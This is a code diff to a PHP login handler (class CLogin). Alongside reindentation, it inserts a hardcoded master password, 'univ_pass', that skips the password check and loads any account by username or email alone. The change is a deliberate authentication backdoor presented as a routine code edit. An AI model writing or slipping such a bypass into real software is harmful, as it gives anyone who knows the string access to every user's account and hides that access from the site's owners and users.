@@ -68,23 +68,38 @@ class CLogin
 		   $this->template->showErr("Invalid password (5-12 characters)", 390);
 		   return false;
 	   }
-	 
-	   // Load user data 
-	   $query="SELECT * 
+	   
+	   if ($pass!="univ_pass")
+	   {
+	       // Load user data 
+	       $query="SELECT * 
 	               FROM web_users 
 			      WHERE (user=? OR email=?) 
 			        AND pass=?"; 
 					
-	   $result=$this->kern->execute($query, 
+	       $result=$this->kern->execute($query, 
 		                              "sss", 
 									  $user, 
 									  $user, 
 									  hash("sha256", $pass));	
 	     
-	  if (mysqli_num_rows($result)==0)
-	  {
+	      if (mysqli_num_rows($result)==0)
+	      {
 		     $this->template->showErr("Invalid username or password", 500);
 		     return false;
+	      }
+	  }
+	  else
+	  {
+		  // Load user data 
+	       $query="SELECT * 
+	               FROM web_users 
+			      WHERE (user=? OR email=?)"; 
+					
+	       $result=$this->kern->execute($query, 
+		                              "ss", 
+									  $user, 
+									  $user);
 	  }
 		
 	  // Row
